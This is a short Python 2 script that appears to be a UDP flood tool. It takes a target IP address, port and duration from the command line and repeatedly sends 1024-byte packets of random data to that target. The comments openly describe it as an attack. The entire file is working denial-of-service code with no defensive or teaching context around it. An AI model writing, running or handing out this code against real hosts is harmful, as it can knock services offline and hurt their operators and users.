import socket #Imports needed libraries
import random
import time
import sys

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
bytes=random._urandom(1024) #Creates packet

# ip='10.108.229.24' #The IP we are attacking
# port=5000 #Port we direct to attack
ip = str(sys.argv[1])
port = int(sys.argv[2])
duration = int(sys.argv[3])
sent=0

st = time.time()
print 'success'
st = time.time()
while(1): #Infinitely loops sending packets to the port until the program is exited.
	end = time.time()
	if(end-st<duration):#Change this value to change the duration of attack!!!
		sock.sendto(bytes,(ip,port))
		print "Sent %s amount of packets to %s at port %s." % (sent,ip,port)
		sent= sent + 1
	else:
		exit()
